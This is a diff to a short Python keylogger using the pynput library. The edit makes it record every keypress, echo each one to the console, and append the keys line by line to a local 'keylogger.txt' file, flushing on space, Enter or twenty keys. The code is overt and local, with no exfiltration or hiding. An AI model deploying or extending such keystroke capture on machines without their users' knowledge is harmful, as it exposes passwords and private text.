@@ -6,17 +6,18 @@ keys = []
 
 def on_press(key):
     global keys
-    if hasattr(key, 'char') and key.char is not None:
-        keys.append(key.char)
-    elif key == keyboard.Key.space:
-        keys.append(' ')
-    if len(keys) >= 20 or key == keyboard.Key.space:
+
+    keys.append(key)
+    print("{0} pressed".format(key))
+
+    if len(keys) >= 20 or key == keyboard.Key.space or key == keyboard.Key.enter:
         write_to_file()
+        keys.clear()
 
 def write_to_file():
     with open("keylogger.txt", "a") as logKey:
-        logKey.write(''.join(keys) + '\n')
-    keys.clear()
+        for key in keys:
+            logKey.write("{0}\n".format(key))
 
 def on_release(key):
     if key == keyboard.Key.esc:
@@ -24,4 +25,3 @@ def on_release(key):
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
-        
